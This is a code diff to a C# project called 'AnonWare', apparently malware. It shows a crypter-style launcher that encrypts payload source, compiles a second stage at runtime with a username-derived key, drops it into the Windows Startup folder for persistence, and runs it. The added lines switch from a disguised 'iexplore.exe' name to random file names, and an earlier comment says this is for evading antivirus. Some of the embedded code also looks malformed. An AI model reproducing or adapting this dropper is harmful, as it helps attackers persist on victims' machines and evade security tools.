@@ -1,4 +1,6 @@
-﻿using System;
+﻿//the 'first launcher' encrypts the source code, compiles the launcher code, moves the launcher to the startup directory, and finally runs the launcher.
+
+using System;
 using System.Text;
 using System.Security.Cryptography;
 using Microsoft.CSharp;
@@ -25,9 +27,37 @@ namespace AnonWare_CSharp
             CompilerParameters myCompilerParameters = new CompilerParameters(referenceAssemblies, myAssemblyName);
             myCompilerParameters.GenerateExecutable = true;
             myCompilerParameters.GenerateInMemory = true;
-            CompilerResults compres = myCodeCompiler.CompileAssemblyFromSource(myCompilerParameters, "using System;using System.Text;using System.Security.Cryptography;using Microsoft.CSharp;using System.Diagnostics;using System.Runtime.InteropServices;using System.Management;using System.Threading;using System.CodeDom.Compiler;using System.Net;using System.IO;namespace Crypt0n{    class MainClass    {        public static void Main(string[] args)        {   string Code = \"" + AnonWareEncrypted + "\";            string Password = Environment.UserName.ToString();            string DecryptedCode = DecryptString(Code, Password);            CSharpCodeProvider myCodeProvider = new CSharpCodeProvider();            ICodeCompiler myCodeCompiler = myCodeProvider.CreateCompiler();            String[] referenceAssemblies = { \"System.dll\", \"Microsoft.CSharp.dll\", \"System.Core.dll\", \"System.Data.dll\", \"System.Data.DataSetExtensions.dll\", \"System.Deployment.dll\", \"System.Xml.dll\", \"System.Xml.Linq.dll\" };            string myAssemblyName = \"assemble2.exe\";            CompilerParameters myCompilerParameters = new CompilerParameters(referenceAssemblies, myAssemblyName);            myCompilerParameters.GenerateExecutable = true;            myCompilerParameters.GenerateInMemory = true;            CompilerResults compres = myCodeCompiler.CompileAssemblyFromSource(myCompilerParameters, DecryptedCode);          Process.Start(\"assemble2.exe\");     }        public static string DecryptString(string Message, string Passphrase)        {            byte[] Results;            System.Text.UTF8Encoding UTF8 = new System.Text.UTF8Encoding();       MD5CryptoServiceProvider HashProvider = new MD5CryptoServiceProvider();            byte[] TDESKey = HashProvider.ComputeHash(UTF8.GetBytes(Passphrase));           TripleDESCryptoServiceProvider TDESAlgorithm = new TripleDESCryptoServiceProvider();            TDESAlgorithm.Key = TDESKey;            TDESAlgorithm.Mode = CipherMode.ECB;            TDESAlgorithm.Padding = PaddingMode.PKCS7;            byte[] DataToDecrypt = Convert.FromBase64String(Message);            try            {                ICryptoTransform Decryptor = TDESAlgorithm.CreateDecryptor();                Results = Decryptor.TransformFinalBlock(DataToDecrypt, 0, DataToDecrypt.Length);            }            finally            {         TDESAlgorithm.Clear();    HashProvider.Clear();  }     return UTF8.GetString(Results);    }    }}" + "");
-            File.Move("assemble.exe", Environment.GetEnvironmentVariable("appdata") + @"\Microsoft\Windows\Start Menu\Programs\Startup\iexplore.exe");
-            Process.Start(Environment.GetEnvironmentVariable("appdata").ToString() + @"\Microsoft\Windows\Start Menu\Programs\Startup\iexplore.exe"); //for AV purposes, it's recommended that you change the name of this, or even make the name self-creating 
+            CompilerResults compres = myCodeCompiler.CompileAssemblyFromSource(myCompilerParameters, "using System;using System.Text;using System.Security.Cryptography;using Microsoft.CSharp;using System.Diagnostics;using System.Runtime.InteropServices;using System.Management;using System.Threading;using System.CodeDom.Compiler;using System.Net;using System.IO;namespace Crypt0n{    class MainClass    {        public static void Main(string[] args)        {   string Code = \"" + AnonWareEncrypted + "\";            string Password = Environment.UserName.ToString();            string DecryptedCode = DecryptString(Code, Password);            CSharpCodeProvider myCodeProvider = new CSharpCodeProvider();            ICodeCompiler myCodeCompiler = myCodeProvider.CreateCompiler();            String[] referenceAssemblies = { \"System.dll\", \"Microsoft.CSharp.dll\", \"System.Core.dll\", \"System.Data.dll\", \"System.Data.DataSetExtensions.dll\", \"System.Deployment.dll\", \"System.Xml.dll\", \"System.Xml.Linq.dll\" };     string password123 = GetPassword();       string myAssemblyName = password123 + \".exe\";            CompilerParameters myCompilerParameters = new CompilerParameters(referenceAssemblies, myAssemblyName);            myCompilerParameters.GenerateExecutable = true;            myCompilerParameters.GenerateInMemory = true;            CompilerResults compres = myCodeCompiler.CompileAssemblyFromSource(myCompilerParameters, DecryptedCode);          Process.Start(password123);     } public static string GetPassword()        {            StringBuilder builder = new StringBuilder();            builder.Append(RandomString(4, true));            builder.Append(RandomNumber(1000, 9999));            builder.Append(RandomString(2, false));            return builder.ToString();        }        private static int RandomNumber(int min, int max)        {            Random random = new Random();            return random.Next(min, max);        }        private static string RandomString(int size, bool lowerCase)        {            StringBuilder builder = new StringBuilder();            Random random = new Random();            char ch;            for (int i = 0; i < size; i++)            {                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));                builder.Append(ch);            }            if (lowerCase)   {             return builder.ToString().ToLower();            return builder.ToString();        } }        public static string DecryptString(string Message, string Passphrase)        {            byte[] Results;            System.Text.UTF8Encoding UTF8 = new System.Text.UTF8Encoding();       MD5CryptoServiceProvider HashProvider = new MD5CryptoServiceProvider();            byte[] TDESKey = HashProvider.ComputeHash(UTF8.GetBytes(Passphrase));           TripleDESCryptoServiceProvider TDESAlgorithm = new TripleDESCryptoServiceProvider();            TDESAlgorithm.Key = TDESKey;            TDESAlgorithm.Mode = CipherMode.ECB;            TDESAlgorithm.Padding = PaddingMode.PKCS7;            byte[] DataToDecrypt = Convert.FromBase64String(Message);            try            {                ICryptoTransform Decryptor = TDESAlgorithm.CreateDecryptor();                Results = Decryptor.TransformFinalBlock(DataToDecrypt, 0, DataToDecrypt.Length);            }            finally            {         TDESAlgorithm.Clear();    HashProvider.Clear();  }     return UTF8.GetString(Results);    }    }}";
+            string password123 = GetPassword();
+            File.Move(password123 + ".exe", Environment.GetEnvironmentVariable("appdata") + @"\Microsoft\Windows\Start Menu\Programs\Startup\" + password123 + ".exe");//self creating ^_^
+            Process.Start(Environment.GetEnvironmentVariable("appdata").ToString() + @"\Microsoft\Windows\Start Menu\Programs\Startup\" + password123 +".exe"); 
+        }
+        public static string GetPassword()
+        {
+            StringBuilder builder = new StringBuilder();
+            builder.Append(RandomString(4, true));
+            builder.Append(RandomNumber(1000, 9999));
+            builder.Append(RandomString(2, false));
+            return builder.ToString();
+        }
+        private static int RandomNumber(int min, int max)
+        {
+            Random random = new Random();
+            return random.Next(min, max);
+        }
+        private static string RandomString(int size, bool lowerCase)
+        {
+            StringBuilder builder = new StringBuilder();
+            Random random = new Random();
+            char ch;
+            for (int i = 0; i < size; i++)
+            {
+                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
+                builder.Append(ch);
+            }
+            if (lowerCase)
+                return builder.ToString().ToLower();
+            return builder.ToString();
         }
         public static string EncryptString(string Message, string Passphrase)
         {
